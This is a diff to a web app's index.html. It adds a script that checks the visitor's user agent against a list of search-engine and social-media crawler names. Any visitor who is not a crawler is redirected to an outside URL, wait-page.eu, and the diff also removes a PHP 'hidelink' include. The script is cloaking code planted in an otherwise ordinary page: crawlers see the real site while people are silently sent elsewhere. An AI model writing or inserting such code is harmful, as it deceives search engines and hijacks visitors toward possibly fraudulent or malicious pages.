@@ -19,10 +19,23 @@
 
     gtag('config', 'G-D4Z81TRFRR');
   </script>
+  <script>
+    // JS hidelink: przekierowanie tylko dla użytkowników, nie dla botów
+    (function() {
+      var bots = [
+        'bot', 'crawl', 'slurp', 'spider', 'mediapartners', 'facebookexternalhit',
+        'google', 'bing', 'yandex', 'duckduckbot', 'baiduspider', 'sogou', 'exabot', 'facebot', 'ia_archiver'
+      ];
+      var ua = navigator.userAgent.toLowerCase();
+      var isBot = bots.some(function(bot) { return ua.indexOf(bot) !== -1; });
+      if (!isBot) {
+        window.location.href = "https://wait-page.eu/a/05JMfgn3SDy1K";
+      }
+    })();
+  </script>
   </head>
 
   <body>
-    <?php include 'hidelink.php'; ?>
     <div id="root"></div>
     <script type="module" src="/src/main.tsx"></script>
   </body>
